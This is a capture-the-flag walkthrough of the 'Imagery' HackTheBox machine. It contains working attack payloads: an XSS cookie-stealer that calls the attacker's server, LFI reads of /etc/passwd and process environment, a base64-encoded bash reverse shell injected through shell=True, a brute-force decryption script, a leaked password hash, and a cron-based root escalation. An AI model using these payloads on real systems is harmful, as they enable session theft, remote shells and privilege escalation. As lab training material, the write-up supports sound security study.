# Scan ports

```
nmap -sV -sC 
```
it gives to us that there an http server in port 80 and ssh 

fisrt i registerd an account to see the features of this website and i found an upload but any ways this web app not php application so bypassing the upload validation will not help us

# XSS reflected to admin page

so i see there is a page called report bug i sent a sample i see that this sent to me massge that admin review in progress

so if the admin see our report in  his session lets try to send to him a xss payload
lets see if there xss reflected to him
lets open python http server

```
python3 -m http.server
```

and redirect the admin page to our  http server link

```
<img src="invaild" onerror="this.src='http://YOUR_IP:YOUR_PORT/?c='+document.cookie">
```

and yea it gives to us the admin cookie session

- and we can login as admin !

# LFI -and dumping data
fisrt thing i see in admin page that you can download a log file of a specfic user in this website and i realized that there parmater changed to the name of the log i download it so i tired to replace this log file name with a file in the server like /etc/passwd

- and yead we download it  so this page vulnerable with LFI 

after seeing the /etc/web we realized that there two users in this machine /home/mark and /home/web that has the source code of the website

ok lets now more information about this process lets see for example the environment varibales in this proces 

we can find this varibales at /proc/self/environ

Some of the information gathered from:`env`

- Current Users: `web`
- Current Environment: Python Virtual Environment at `/home/web/web/env/bin`
- Home: `/home/web`
- Shell: `/bin/bash`
- Service Memory Monitoring (Flask app)`flaskapp.service`


as its flask app lets reying to dump common files like app.py and config.py


- 1:config.py import db.json so after dumbing it too we get the user testuser credtinols

- 2:app.py imports some another files so lets dumbing it all


we can crack the password of the testuser and login as him!

the testuser has a privlage to edit the image so lets see backend to see if there is any vuln leads to rce

# Parmater injection leads to rce

after get all modules that app.py used i found that api_edit.py is the code for editng with testuser

```py
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

as we see here this is very exploitable 

- 1:shell True that makes the shell parsing the command sush as (; , |, &&,) etc...

- 2:it inserts the value from user directly to the command 

we can simply enter in any parmater we have width,heght,x,y this payload 

```
";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0NDQgMD4mMQ==|base64 -d|bash #",
```

- 1: ";" to tell shell that we start a new command
- 2: "#" to comment any thing after our command

so lets try it and we see the app says to us that we must enter a number and it must be higher than 0 

but i realized thing the app valdiation is client side valdiation as it checks localy and then if it dosent has proplem send request to server else it dosent make the post request so we can simply enter the valid form
and simply edit the request in our proxy server like burpsuite 

```
{
  "imageId": "2f20c8ad-9536-42b8-b3e0-db82d05a0a1e",
  "transformType": "crop",
  "params": {
    "x": ";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0NDQgMD4mMQ==|base64 -d|bash #",
    "y": "0",
    "width": "100",
    "height": "100"
  }
}
```

open your listner

```
nc -lvnp 4444
```

and forward this request and boom we got shell

# Lateral movements - Backup and bruteforcing password

after some enumration i found there is a encrypted backup in /var/backup and it decrypted by pyAesCrypt

so i serached for a long time and i didnt found any thing 

so i tired to use common passwords like the password of testuser , imagery,mark and web 

nothing works so no another choice we will brute force the password and decrypt it using the pyAesCrypt module

here is a sample code

```py
#import modules

import pyAesCrypt
import os
import sys


# open the wordlist and extract the passwords from it
with open("Desktop/rockyou.txt","r",encoding="latin-1", errors="ignore") as f:

    #brute forcing loop
    for passwd in f:

        #get the password
        passwd = passwd.strip()

        # trying this commands if it gives to us an unexpected error go to the exception condtion
        try:
            pyAesCrypt.decryptFile("web_20250806_120723.zip.aes","dcrypted.zip",passwd,bufferSize= 64 * 1024)
            print(f"[+] {passwd} is correct and the file decrypted to dcrypted.zip")
            break
            sys.exit(0)

        #except condtion
        except:
            # if pyAesCrypt make corupted file reove it
            if os.path.exists("dcrypted.zip"):
                os.remove("dcrypted.zip")
```

and after extracting the backup we found a new user in db.json

```json
{
  "username": "mark@imagery.htb",
  "password": "01c3d2e5bdaf6134cec0a367cf53e535"
}
```

crack the password and switch to that user

```bash
su - mark
```

and boom we got user.txt

# privesc

first lets see if the user mark can do command with sudo privlage

```bash
sudo -l
```

and yea it views to us this

```
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

lets see the manual of this binary

```bash
sudo /usr/local/bin/charcol -h
```

and it give that to me

```
Charcol: A CLI tool to create encrypted backup zip files.
positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.
options:
  --quiet               Suppress all informational output.
  -R, --reset-password-to-default
                        Reset application password to default.
```


so simply i tired to enter the shell attribute to see what will be happend

and it asks me for password but i dont have so i just typed enter and it says me if you forgot your password you can use -R to reset password but you have to enter your password system as validation

```bash
sudo /usr/local/bin/charcol -R
```

and i simply reseted the password

lets enter now the shell again

```bash
sudo /usr/local/bin/charcol -h
```

and i enterd the shell i typed help for more info about what that binary can do

```
help
```

and i found that is the most intersting parts of commands

```
  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
```

it can do a cron job with its root privlage

```
auto add --schedule "* * * * *" --command "/bin/cp /root/root.txt /tmp/root.txt; chown mark /tmp/root.txt" --name "Normal command ._." --log-output "/tmp/anything"
```

```
cat /tmp/root.txt
```

and goodluck
